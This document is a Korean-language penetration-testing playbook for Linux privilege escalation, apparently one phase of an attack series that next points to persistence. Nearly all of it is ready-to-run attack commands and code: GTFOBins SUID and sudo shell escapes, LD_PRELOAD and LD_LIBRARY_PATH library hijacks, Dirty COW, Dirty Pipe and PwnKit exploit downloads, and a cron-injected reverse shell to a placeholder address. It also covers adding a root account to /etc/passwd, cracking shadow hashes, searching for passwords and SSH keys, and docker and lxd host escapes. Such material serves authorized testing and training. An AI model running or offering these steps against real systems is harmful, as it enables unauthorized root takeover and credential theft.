# Phase 5: 권한 상승 (Privilege Escalation)

## 개요
권한 상승은 일반 사용자(www-data, apache 등)에서 root 권한으로 상승하는 과정입니다. 시스템의 잘못된 설정, 취약한 서비스, SUID 바이너리 등을 악용하여 최고 권한을 획득합니다.

## 필수 도구
- LinPEAS
- LinEnum
- Linux Exploit Suggester
- pspy
- GTFOBins
- Unix-privesc-check

---

## 1. 정보 수집

### 1.1 시스템 정보
```bash
# OS 버전 확인
cat /etc/issue
cat /etc/*-release
uname -a
uname -r  # 커널 버전

# 환경 변수
env
echo $PATH
echo $HOME

# 현재 사용자 정보
whoami
id
groups

# 다른 사용자 확인
cat /etc/passwd
cat /etc/passwd | grep -v nologin
cat /etc/group

# 로그인 기록
w
who
last
lastlog

# 실행 중인 프로세스
ps aux
ps aux | grep root
ps -ef
pstree -p

# 네트워크 연결
netstat -antup
ss -antup
netstat -tulpn

# 설치된 소프트웨어
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS
which gcc
which python3
which perl
```

### 1.2 파일 시스템 탐색
```bash
# SUID/SGID 파일 찾기 (매우 중요!)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# World-writable 파일
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o w -type f 2>/dev/null

# 흥미로운 파일 검색
find / -name "*.conf" 2>/dev/null
find / -name "config*" 2>/dev/null
find / -name "*.php" 2>/dev/null
find / -name "*.log" 2>/dev/null

# 비밀번호 파일 검색
grep -ri password /home 2>/dev/null
grep -ri password /var/www 2>/dev/null
find / -name "*password*" 2>/dev/null
find / -name "*secret*" 2>/dev/null

# SSH 키 검색
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null

# 최근 수정된 파일
find /home -mtime -1 2>/dev/null
find /var/www -mtime -1 2>/dev/null
```

### 1.3 권한 확인
```bash
# Sudo 권한 확인
sudo -l

# /etc/sudoers 읽기 시도
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# Cron jobs 확인
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/* 2>/dev/null

# systemd timers
systemctl list-timers --all
```

---

## 2. 자동화 도구 사용

### 2.1 LinPEAS (가장 추천)
```bash
# LinPEAS 다운로드 및 실행
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# 네트워크 없이 전송 (공격자 머신에서)
# 1. Base64 인코딩
cat linpeas.sh | base64 -w 0

# 2. 대상 서버에서 디코딩
echo "BASE64_STRING" | base64 -d > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 또는 curl로 직접 실행
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 출력 색상 제거 (로그 파일용)
./linpeas.sh -a 2>&1 | tee linpeas.txt
```

### 2.2 LinEnum
```bash
# LinEnum 다운로드
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# 철저한 스캔
./LinEnum.sh -t

# 키워드 검색
./LinEnum.sh -k password
./LinEnum.sh -k secret

# 출력 저장
./LinEnum.sh -t -r linEnum_report.txt
```

### 2.3 Linux Exploit Suggester
```bash
# Linux Exploit Suggester 2
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 2  # 레벨 2 (더 자세히)
```

### 2.4 pspy (프로세스 모니터링)
```bash
# pspy 다운로드 (cron job 탐지용)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# 백그라운드에서 실행하고 로그 저장
./pspy64 > pspy.log 2>&1 &

# 로그 실시간 확인
tail -f pspy.log
```

---

## 3. SUID/SGID 악용

### 3.1 위험한 SUID 바이너리
```bash
# GTFOBins에서 악용 가능한 SUID 바이너리 확인
# https://gtfobins.github.io/

# 자주 악용되는 SUID 바이너리들:

# nmap (구버전)
nmap --interactive
!sh

# find
find / -exec /bin/bash -p \; -quit

# vim
vim -c ':!/bin/bash'

# less
less /etc/passwd
!/bin/bash

# more
more /etc/passwd
!/bin/bash

# cp (파일 덮어쓰기)
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl
perl -e 'exec "/bin/bash";'

# awk
awk 'BEGIN {system("/bin/bash")}'

# bash
bash -p

# tar
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### 3.2 SUID 바이너리로 쉘 획득
```bash
# 일반적인 패턴
# 1. SUID 비트가 설정된 바이너리 찾기
find / -perm -4000 -type f 2>/dev/null

# 2. GTFOBins에서 해당 바이너리 검색
# https://gtfobins.github.io/

# 3. SUID 섹션 확인하여 명령어 실행

# 예시: base64가 SUID로 설정된 경우
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode

# 예시: systemctl이 SUID인 경우
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
/bin/bash -p
```

### 3.3 커스텀 SUID 익스플로잇
```bash
# SUID 바이너리가 다른 프로그램을 상대 경로로 호출하는 경우
# 예: SUID 바이너리가 "ps"를 호출

# 1. 악의적인 "ps" 생성
cat > /tmp/ps << 'EOF'
#!/bin/bash
/bin/bash -p
EOF

chmod +x /tmp/ps

# 2. PATH 환경변수 조작
export PATH=/tmp:$PATH

# 3. SUID 바이너리 실행
/usr/local/bin/vulnerable_suid_binary
```

---

## 4. Sudo 악용

### 4.1 Sudo 권한 확인
```bash
# 현재 사용자의 sudo 권한
sudo -l

# 출력 예시:
# (root) NOPASSWD: /usr/bin/vim
# (root) NOPASSWD: /usr/bin/find
# (ALL : ALL) ALL
```

### 4.2 GTFOBins를 통한 Sudo 악용
```bash
# vim
sudo vim -c ':!/bin/bash'

# find
sudo find / -exec /bin/bash \; -quit

# less
sudo less /etc/passwd
!/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python
sudo python -c 'import os; os.system("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# man
sudo man man
!/bin/bash

# git
sudo git help config
!/bin/bash

# ftp
sudo ftp
!/bin/bash

# zip
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

### 4.3 LD_PRELOAD 악용
```bash
# sudo -l 출력에서 확인:
# env_keep+=LD_PRELOAD

# 악의적인 공유 라이브러리 생성
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# 컴파일
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# 실행
sudo LD_PRELOAD=/tmp/shell.so find
```

### 4.4 LD_LIBRARY_PATH 악용
```bash
# sudo -l 출력에서 확인:
# env_keep+=LD_LIBRARY_PATH

# 시스템 라이브러리 확인 (예: apache2)
ldd /usr/sbin/apache2

# 악의적인 라이브러리 생성
cat > /tmp/library.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# 컴파일
gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/library.c

# 실행
sudo LD_LIBRARY_PATH=/tmp apache2
```

---

## 5. Kernel Exploits

### 5.1 커널 버전 확인
```bash
uname -a
uname -r
cat /proc/version
```

### 5.2 유명한 Linux Kernel Exploits
```bash
# Dirty COW (CVE-2016-5195) - 커널 2.6.22 ~ 4.8.3
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123
su firefart  # password: password123

# Dirty Pipe (CVE-2022-0847) - 커널 5.8 ~ 5.16.11
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
gcc exploit-1.c -o exploit
./exploit

# PwnKit (CVE-2021-4034) - pkexec 취약점
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh
chmod +x PwnKit.sh
./PwnKit.sh

# Ubuntu Kernel Exploits
# - CVE-2017-16995 (4.4.0-116)
# - CVE-2021-3493 (Ubuntu 20.04)
```

### 5.3 Kernel Exploit 자동 검색
```bash
# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Linuxprivchecker
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
python linuxprivchecker.py
```

---

## 6. Cron Jobs 악용

### 6.1 Cron Jobs 확인
```bash
# 시스템 crontab
cat /etc/crontab

# Cron 디렉토리
ls -la /etc/cron.d
ls -la /etc/cron.hourly
ls -la /etc/cron.daily
ls -la /etc/cron.weekly
ls -la /etc/cron.monthly

# 사용자별 crontab
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null

# 실시간 프로세스 모니터링 (pspy)
./pspy64
```

### 6.2 Writable Cron Script 악용
```bash
# Cron job이 실행하는 스크립트가 쓰기 가능한 경우
ls -la /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root 123 Jan 1 12:00 /usr/local/bin/backup.sh

# 스크립트에 리버스 쉘 추가
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /usr/local/bin/backup.sh

# 또는 SUID 쉘 생성
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh

# Cron이 실행될 때까지 대기 후
/tmp/rootbash -p
```

### 6.3 PATH 변수 악용
```bash
# /etc/crontab에서 PATH 확인
cat /etc/crontab
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Cron job:
# * * * * * root backup.sh

# /home/user가 PATH의 첫 번째이고 쓰기 가능한 경우
cat > /home/user/backup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

chmod +x /home/user/backup.sh

# Cron 실행 대기 후
/tmp/rootbash -p
```

### 6.4 Wildcard Injection
```bash
# Cron job이 tar를 와일드카드로 사용하는 경우
# * * * * * root cd /home/user && tar czf /tmp/backup.tar.gz *

# 악의적인 파일 생성
cd /home/user
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh

# Checkpoint 악용
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# Cron 실행 대기
/tmp/rootbash -p
```

---

## 7. 기타 권한 상승 기법

### 7.1 /etc/passwd 쓰기 가능
```bash
# /etc/passwd가 쓰기 가능한지 확인
ls -la /etc/passwd

# 새 root 사용자 생성
openssl passwd -1 -salt salt password123
# $1$salt$qAkHN3n4C7v.KEsFJ7O/N1

# /etc/passwd에 추가
echo 'hacker:$1$salt$qAkHN3n4C7v.KEsFJ7O/N1:0:0:root:/root:/bin/bash' >> /etc/passwd

# 로그인
su hacker
# password: password123
```

### 7.2 /etc/shadow 읽기 가능
```bash
# /etc/shadow 읽기
cat /etc/shadow

# root 해시 추출
root:$6$xyz$abc...:18000:0:99999:7:::

# John the Ripper로 크랙
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat으로 크랙
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 7.3 NFS 공유 악용
```bash
# NFS 공유 확인
cat /etc/exports
# /srv/share *(rw,no_root_squash)

# 공격자 머신에서 마운트
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/srv/share /tmp/nfs

# SUID 바이너리 생성
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# 대상 서버에서 실행
/srv/share/rootbash -p
```

### 7.4 Docker 그룹 멤버십
```bash
# 현재 사용자가 docker 그룹에 속한 경우
groups
# www-data docker

# 컨테이너로 호스트 파일시스템 마운트
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# 또는 권한 있는 컨테이너 실행
docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

### 7.5 LXD/LXC 그룹 멤버십
```bash
# LXD 그룹 확인
groups
# www-data lxd

# Alpine 이미지 빌드 (공격자 머신)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine

# 대상 서버로 전송
# 이미지 임포트
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

# 컨테이너 생성 및 시작
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# /mnt/root가 호스트 파일시스템
cd /mnt/root
```

### 7.6 환경 변수 악용
```bash
# $PATH 확인
echo $PATH

# 현재 디렉토리가 PATH에 포함된 경우
# SUID 바이너리가 상대 경로로 명령 실행 시

# 악의적인 바이너리 생성
cat > ls << 'EOF'
#!/bin/bash
/bin/bash -p
EOF

chmod +x ls
export PATH=.:$PATH

# SUID 바이너리 실행
/vulnerable/suid/binary
```

---

## 8. 실전 시나리오

### 8.1 전체 권한 상승 프로세스
```bash
# 1단계: 기본 정보 수집
whoami
id
uname -a
cat /etc/issue

# 2단계: LinPEAS 실행
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt

# 3단계: 우선순위별 확인
# a) Sudo 권한
sudo -l

# b) SUID 바이너리
find / -perm -4000 -type f 2>/dev/null

# c) Writable /etc/passwd
ls -la /etc/passwd

# d) Cron jobs
cat /etc/crontab
./pspy64

# e) 커널 익스플로잇
./linux-exploit-suggester.sh

# 4단계: 익스플로잇 실행
# (발견된 취약점에 따라)

# 5단계: Root 쉘 확인
whoami  # root
id      # uid=0(root) gid=0(root) groups=0(root)
```

### 8.2 자동화 스크립트
```bash
#!/bin/bash
# privesc_auto.sh - 자동 권한 상승 체크

echo "[*] Starting automated privilege escalation checks..."

# SUID 바이너리
echo "[*] Checking SUID binaries..."
find / -perm -4000 -type f 2>/dev/null > /tmp/suid.txt
cat /tmp/suid.txt

# Sudo 권한
echo "[*] Checking sudo permissions..."
sudo -l 2>/dev/null

# Writable files
echo "[*] Checking writable files..."
find /etc -writable -type f 2>/dev/null

# Cron jobs
echo "[*] Checking cron jobs..."
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null

# 커널 버전
echo "[*] Kernel version:"
uname -r

echo "[*] Download and run LinPEAS for detailed analysis"
```

---

## 핵심 정리

1. 자동화 도구 먼저 실행 - LinPEAS, LinEnum으로 전체적인 취약점 파악
2. SUID/Sudo 우선 확인 - 가장 쉽고 빠른 권한 상승 경로
3. GTFOBins 활용 - 모든 SUID/Sudo 바이너리 익스플로잇 방법 검색
4. Cron jobs 모니터링 - pspy로 숨겨진 작업 발견
5. 커널 익스플로잇은 최후 수단 - 시스템 크래시 위험

## 다음 단계
Phase 6: 지속성 확보 (Persistence)로 진행하여 재부팅 후에도 접근 유지
